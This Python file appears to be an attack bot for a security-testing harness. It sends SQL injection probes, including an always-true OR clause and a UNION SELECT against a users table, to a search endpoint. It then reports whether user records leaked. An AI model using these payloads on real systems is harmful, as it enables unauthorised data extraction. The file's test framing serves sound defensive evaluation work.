from __future__ import annotations

import time

from engine.bots.sdk import (
    BotClient,
    BudgetExceededError,
    load_config,
    send_progress,
    send_report,
)

SEARCH_PROBES = [
    "laptop",
    "mouse",
    "keyboard",
    "tech' OR '1'='1",
    "%' UNION SELECT id, username, 0 FROM users --",
]


def main() -> None:
    config = load_config()
    start = time.monotonic()

    succeeded = False
    evidence: list[str] = []
    impact = {"accounts_compromised": 0, "records_leaked": 0, "records_destroyed": 0}

    with BotClient(config) as client:
        try:
            for probe in SEARCH_PROBES:
                send_progress(client.requests_sent, f"Probing search: {probe}")
                try:
                    resp = client.get("/search", params={"q": probe})
                    if resp.status_code == 200:
                        data = resp.json()
                        results = data.get("results", [])
                        # Check if any sensitive user usernames leaked in results
                        leaked_users = [
                            r.get("name")
                            for r in results
                            if r.get("name") in ("alice", "admin", "bob")
                        ]
                        if leaked_users:
                            succeeded = True
                            impact["records_leaked"] = len(leaked_users)
                            evidence.append(
                                f"Extracted {len(leaked_users)} user record(s) via SQL injection: {', '.join(leaked_users)}"
                            )
                except Exception:
                    pass
        except BudgetExceededError:
            pass

        duration = round(time.monotonic() - start, 3)
        send_report(
            attack="sql_injection_search",
            seed=config.seed,
            succeeded=succeeded,
            completed=True,
            impact=impact,
            usage={"requests_sent": client.requests_sent, "duration_s": duration},
            evidence=evidence,
        )


if __name__ == "__main__":
    main()
